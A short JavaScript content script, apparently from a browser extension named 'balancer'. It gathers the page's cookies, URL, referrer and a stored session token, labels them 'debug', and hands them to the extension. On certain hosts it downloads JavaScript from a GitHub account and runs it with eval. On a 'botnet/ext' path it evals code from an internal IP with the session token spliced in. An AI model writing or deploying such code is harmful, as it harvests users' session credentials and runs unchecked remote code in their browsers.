function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
cookie=document.cookie;
url=document.location.href;
ref=document.referrer;
var hash=localStorage.getItem("balancerSess");

var debug = {
	cookie: cookie,
	url: url,
	ref: ref,
	hash: hash
}

chrome.runtime.sendMessage(debug, function(response) {
  console.log(rr=response);
if(document.location.href.indexOf('tp2-rt')>-1){	
	//$.cookie("balancerSess", rr.hash);
}
	});


if(document.location.href.indexOf('https://esd.pr.')>-1){eval(httpGet('https://raw.githubusercontent.com/darakcheeff/balancer/master/esd.js'));}

window.onload = function(){
	if(document.location.href.indexOf('radlog.billing.')>-1){eval(httpGet('https://raw.githubusercontent.com/darakcheeff/balancer/master/radlog.js'));}
	if(document.location.href.indexOf('fttb.mts')>-1){eval(httpGet('https://raw.githubusercontent.com/darakcheeff/balancer/master/fttb.js'));}
	if(document.location.href.indexOf('tp2-rt')>-1){eval(httpGet('https://raw.githubusercontent.com/darakcheeff/balancer/master/tp2-rt.js'));}
	selector=location.href.split("/");
	if((selector[3]=="botnet")&&(selector[4]=="ext")){
	eval('hash="'+hash+'";'+httpGet('http://10.68.100.60/botnet/ext/botnet.js'));
}
}

